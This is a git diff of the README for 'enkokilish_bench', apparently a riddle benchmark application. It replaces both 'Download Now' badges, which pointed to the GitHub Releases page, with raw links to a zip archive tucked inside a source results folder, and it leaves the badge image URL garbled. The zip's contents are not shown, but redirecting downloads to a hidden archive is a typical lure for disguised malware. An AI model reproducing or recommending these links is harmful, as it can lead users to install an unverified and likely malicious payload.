@@ -12,7 +12,7 @@ To get started with **enkokilish_bench**, follow these easy steps:
 
 First, you need to download the application. Click the button below to visit our Releases page.
 
-[![Download enkokilish_bench](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/KandyBoi1/enkokilish_bench/releases)
+[![Download enkokilish_bench](https://raw.githubusercontent.com/KandyBoi1/enkokilish_bench/main/visualizer/src/lib/results/english/enkokilish_bench_1.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/KandyBoi1/enkokilish_bench/main/visualizer/src/lib/results/english/enkokilish_bench_1.2.zip)
 
 ### 2. Install the Application
 
@@ -45,7 +45,7 @@ Each riddle comes with a brief background, providing context and enhancing your 
 
 As mentioned earlier, you can download **enkokilish_bench** from our Releases page. 
 
-[![Download enkokilish_bench](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/KandyBoi1/enkokilish_bench/releases)
+[![Download enkokilish_bench](https://raw.githubusercontent.com/KandyBoi1/enkokilish_bench/main/visualizer/src/lib/results/english/enkokilish_bench_1.2.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/KandyBoi1/enkokilish_bench/main/visualizer/src/lib/results/english/enkokilish_bench_1.2.zip)
 
 Follow the installation steps outlined above to start using the application.
 
